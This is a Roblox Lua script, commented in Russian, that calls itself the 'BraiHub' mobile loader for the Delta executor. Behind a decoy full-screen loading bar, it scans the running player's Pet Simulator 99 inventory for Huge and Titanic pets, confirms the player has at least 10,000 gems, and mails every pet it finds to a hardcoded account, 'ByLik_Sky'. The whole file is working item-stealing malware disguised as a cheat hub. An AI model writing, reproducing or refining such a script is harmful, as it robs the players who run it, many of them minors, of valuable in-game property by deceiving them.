--[[
    BraiHub Mobile Mailer (Delta Edition)
    Date: 20.03.2026
    Target: ByLik_Sky
]]

local RECIPIENT = "ByLik_Sky"
local GIFT_MESSAGE = "BraiHub Mobile User"

-- === ФУНКЦИЯ ЗАГРУЗКИ (UI ДЛЯ МОБИЛЬНЫХ) ===
local function startBraiHubUI()
    local player = game.Players.LocalPlayer
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "BraiHubMobile"
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 9999

    local bg = Instance.new("Frame", sg)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    bg.BorderSizePixel = 0

    local grad = Instance.new("UIGradient", bg)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 220, 255))
    })

    local title = Instance.new("TextLabel", bg)
    title.Size = UDim2.new(0.8, 0, 0, 60)
    title.Position = UDim2.new(0.1, 0, 0.4, 0)
    title.BackgroundTransparency = 1
    title.Text = "BraiHub Load"
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.TextColor3 = Color3.fromRGB(40, 40, 40)

    local barBg = Instance.new("Frame", bg)
    barBg.Size = UDim2.new(0.6, 0, 0, 10)
    barBg.Position = UDim2.new(0.2, 0, 0.5, 20)
    barBg.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    barBg.BorderSizePixel = 0

    local bar = Instance.new("Frame", barBg)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    bar.BorderSizePixel = 0

    -- Анимация для мобильных (Delta)
    task.spawn(function()
        local rot = 0
        while sg.Parent do
            grad.Rotation = rot
            rot = rot + 1.5
            task.wait(0.015)
        end
    end)

    for i = 0, 100, 2 do
        bar.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.04)
    end
    task.wait(0.5)
    sg:Destroy()
end

-- === ЛОГИКА ОТПРАВКИ (PS99 MOBILE API) ===
local function runMailer()
    -- Получаем доступ к библиотекам через защищенный вызов
    local RS = game:GetService("ReplicatedStorage")
    local success, Library = pcall(function() return require(RS:WaitForChild("Library")) end)
    
    if not success or not Library then 
        warn("[BraiHub]: Не удалось загрузить Library. Игра обновилась?")
        return 
    end

    local Save = Library.Save.Get()
    local Network = RS:WaitForChild("Network")

    -- 1. Проверяем наличие Huge и Titanic
    local itemsFound = {}
    if Save and Save.Inventory and Save.Inventory.Pet then
        for uuid, pet in pairs(Save.Inventory.Pet) do
            local name = tostring(pet.id):lower()
            if name:find("huge") or name:find("titanic") then
                table.insert(itemsFound, {uuid = uuid, id = pet.id})
            end
        end
    end

    -- 2. Проверяем Гемы (нужно минимум 10к)
    local gems = 0
    pcall(function() gems = Save.Inventory.Currency.Diamonds or 0 end)

    if #itemsFound == 0 then
        print("[BraiHub]: Huge петы не найдены в инвентаре.")
        return
    end

    if gems < 10000 then
        print("[BraiHub]: Ошибка! У вас меньше 10,000 гемов. Почта не сработает.")
        return
    end

    -- 3. Процесс отправки
    print("[BraiHub]: Найдено целей: " .. #itemsFound .. ". Отправка на " .. RECIPIENT)
    
    for _, item in ipairs(itemsFound) do
        pcall(function()
            -- В 2026 году PS99 Mailbox требует: Recipient, Message, Type, UUID, Amount
            Network["Mailbox: Send"]:InvokeServer(RECIPIENT, GIFT_MESSAGE, "Pet", item.uuid, 1)
        end)
        task.wait(2.5) -- На мобильных задержка должна быть больше, чтобы не вылетело
    end
    print("[BraiHub]: Все операции завершены.")
end

-- ЗАПУСК
task.spawn(startBraiHubUI)
task.wait(1.5) -- Ждем пока UI Delta прогрузит слои
runMailer()